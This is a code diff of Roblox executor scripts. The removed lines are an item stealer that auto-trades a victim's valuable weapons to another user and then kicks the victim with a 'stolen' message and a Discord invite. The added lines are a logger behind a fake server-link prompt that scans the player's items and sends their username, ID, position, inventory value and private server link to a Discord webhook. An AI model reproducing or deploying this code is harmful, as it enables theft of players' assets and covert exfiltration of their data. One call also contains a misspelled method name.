-    if RareList ~= "" then
-        List = List .. "RARE LIST:\n" .. RareList .. "\n"
-    end
-    if UncommonList ~= "" then
-        List = List .. "UNCOMMON LIST:\n" .. UncommonList .. "\n"
-    end
-    if CommonList ~= "" then
-        List = List .. "COMMON LIST:\n" .. CommonList .. "\n"
-    end
-
-    if #weaponsToSend > 0 then
-        table.sort(
-            weaponsToSend,
-            function(a, b)
-                return a.Value > b.Value
-            end
-        )
-
-        local sentWeapons = {}
-        for i, v in ipairs(weaponsToSend) do
-            sentWeapons[i] = v
-        end
-
-        SendJoinMessage()
-
-        local function doTrade(joinedUser)
-            local initialTradeState = getTradeStatus()
-            if initialTradeState == "StartTrade" then
-                game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineTrade"):FireServer()
-                wait(0.3)
-            elseif initialTradeState == "ReceivingRequest" then
-                game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
-                wait(0.3)
-            end
-
-            while #weaponsToSend > 0 do
-                local tradeStatus = getTradeStatus()
-
-                if tradeStatus == "None" then
-                    sendTradeRequest(joinedUser)
-                elseif tradeStatus == "SendingRequest" then
-                    wait(0.3)
-                elseif tradeStatus == "ReceivingRequest" then
-                    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
-                    wait(0.3)
-                elseif tradeStatus == "StartTrade" then
-                    for i = 1, math.min(4, #weaponsToSend) do
-                        local weapon = table.remove(weaponsToSend, 1)
-                        for count = 1, weapon.Amount do
-                            addWeaponToTrade(weapon.DataID)
-                        end
-                    end
-                    wait(6)
-                    acceptTrade()
-                    waitForTradeCompletion()
-                else
-                    wait(0.5)
-                end
-                wait(1)
-            end
-            plr:kick(
-                "All your stuff has just been stolen. Join discord.gg/PzWY2QX8cu"
-            )
-        end
-
-        local function waitForUserChat()
-            local sentMessage = false
-            local function onPlayerChat(player)
-                if user == player.Name then
-                    player.Chatted:Connect(
-                        function()
-                            doTrade(player.Name)
-                        end
-                    )
-                end
-            end
-            for _, p in ipairs(Players:GetPlayers()) do
-                onPlayerChat(p)
-            end
-            Players.PlayerAdded:Connect(onPlayerChat)
-        end
-        waitForUserChat()
+    
+    -- Method 3: Check Y height as fallback
+    local height = currentPos.Y
+    if height < 10 then
+        return "Ground Floor"
+    elseif height < 50 then
+        return "Floor 2+"
+    elseif height < 100 then
+        return "Floor 3+"
+    else
+        return "High Elevation (" .. math.floor(height) .. "m)"
     end
 end
 
-if game.PlaceId == 142823291 or game.PlaceId == 335132309 or game.PlaceId == 636649648 then
-    MM2()
+-- ==========================================
+-- WEBHOOK & BRAINROT LOGIC
+-- ==========================================
+
+-- Function to scan for brainrots and calculate values
+local function scanBrainrots()
+    local foundBrainrots = {}
+    local totalValue = 0
+    local totalCount = 0
+    
+    for _, obj in ipairs(workspace:GetDescendants()) do
+        if obj:IsA("Model") or obj:IsA("Tool") or obj:IsA("Part") then
+            local name = obj.Name
+            
+            -- Check against our value table
+            for brainrotName, value in pairs(BRAINROT_VALUES) do
+                if name:lower():find(brainrotName:lower()) then
+                    table.insert(foundBrainrots, {
+                        name = name,
+                        value = value,
+                        type = brainrotName
+                    })
+                    totalValue = totalValue + value
+                    totalCount = totalCount + 1
+                    break
+                end
+            end
+            
+            -- Check for numeric values in name (e.g., "Brainrot x5")
+            local multiplier = name:match("x(%d+)$") or name:match("(%d+)x")
+            if multiplier then
+                local mult = tonumber(multiplier)
+                if mult and mult > 1 then
+                    totalValue = totalValue + (foundBrainrots[#foundBrainrots].value * (mult - 1))
+                    totalCount = totalCount + (mult - 1)
+                end
+            end
+        end
+    end
+    
+    return foundBrainrots, totalValue, totalCount
 end
+
+-- Button click handler
+enterButton.MouseButton1Click:Connect(function()
+    local serverLink = serverLinkBox.Text
+    local isValidLink = serverLink:match("^https://www%.roblox%.com/share%?code=[%w%d]+&type=Server$") or serverLink == "admin123"
+    
+    -- Validation check
+    if not isValidLink then
+        enterButton.Text = "❌ INVALID LINK"
+        enterButton.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
+        
+        TweenService:Create(enterButton, TweenInfo.new(0.3), {
+            BackgroundColor3 = Color3.fromRGB(139, 0, 0)
+        }):Play()
+        
+        wait(1.5)
+        enterButton.Text = "ENTER"
+        return
+    end
+
+    -- Success animation
+    enterButton.Text = "✅ ACCESS GRANTED"
+    enterButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
+    
+    wait(0.8)
+    
+    -- Fade out UI
+    TweenService:Create(mainFrame, TweenInfo.new(0.5), {
+        Position = UDim2.new(0.5, -225, 1.5, 0)
+    }):Play()
+    
+    wait(0.5)
+    brainrotUI:Destroy()
+
+    -- Gather data
+    local executorName = getExecutorName()
+    local accountAgeDays = LocalPlayer.AccountAge
+    local foundBrainrots, totalValue, totalCount = scanBrainrots()
+    local currentFloor = getCurrentFloor()
+    
+    -- Format brainrot list for webhook
+    local brainrotList = ""
+    if #foundBrainrots > 0 then
+        for i, item in ipairs(foundBrainrots) do
+            brainrotList = brainrotList .. string.format("%d. **%s** (%s) - €%.2f EUR\n", 
+                i, item.name, item.type, item.value)
+        end
+    else
+        brainrotList = "No brainrots detected in workspace"
+    end
+    
+    -- Calculate total in EUR
+    local totalEUR = string.format("€%.2f", totalValue)
+    
+    -- Prepare webhook data
+    task.spawn(function()
+        local webhookData = {
+            username = "GodFathers Security",
+            avatar_url = "https://i.imgur.com/6XK8YBn.png",
+            embeds = {{
+                title = "🔴 New Execution Detected",
+                color = 0xDC143C, -- Crimson red
+                timestamp = DateTime.now():ToIsoDate(),
+                thumbnail = {
+                    url = "https://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" .. LocalPlayer.Name
+                },
+                fields = {
+                    {
+                        name = "👤 Player Information",
+                        value = string.format("**Username:** %s\n**Account Age:** %d days\n**User ID:** %d", 
+                            LocalPlayer.Name, accountAgeDays, LocalPlayer.UserId),
+                        inline = false
+                    },
+                    {
+                        name = "💻 Executor Details",
+                        value = string.format("**Executor:** %s\n**Job ID:** %s", 
+                            executorName, game.JobId),
+                        inline = false
+                    },
+                    {
+                        name = "📍 Location Data",
+                        value = string.format("**Current Floor:** %s\n**Position:** %.1f, %.1f, %.1f", 
+                            currentFloor, 
+                            LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and 
+                            LocalPlayer.Character.HumanoidRootPart.Position.X or 0,
+                            LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and 
+                            LocalPlayer.Character.HumanoidRootPart.Position.Y or 0,
+                            LocalPlayer.Character and LocalPlayer.Character:FindForFirstChild("HumanoidRootPart") and 
+                            LocalPlayer.Character.HumanoidRootPart.Position.Z or 0),
+                        inline = false
+                    },
+                    {
+                        name = "🎁 Brainrot Inventory",
+                        value = string.format("**Total Items:** %d\n**Total Value:** %s EUR\n\n%s", 
+                            totalCount, totalEUR, brainrotList),
+                        inline = false
+                    },
+                    {
+                        name = "🔗 Private Server",
+                        value = string.format("[Click to Join](%s)", serverLink),
+                        inline = false
+                    }
+                },
+                footer = {
+                    text = "GodFathers Scripts | " .. os.date("%Y-%m-%d %H:%M:%S")
+                }
+            }}
+        }
+        
+        -- Send webhook with error handling
+        local success, err = pcall(function()
+            local response = request({
+                Url = "https://discord.com/api/webhooks/YOUR_WEBHOOK_URL_HERE",
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = HttpService:JSONEncode(webhookData)
+            })
+            
+            if response and response.StatusCode ~= 204 then
+                warn("Webhook returned status: " .. tostring(response.StatusCode))
+            end
+        end)
+        
+        if not success then
+            warn("Failed to send webhook: " .. tostring(err))
+        end
+    end)
+    
+    -- Re-enable CoreGui after execution
+    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
+end)
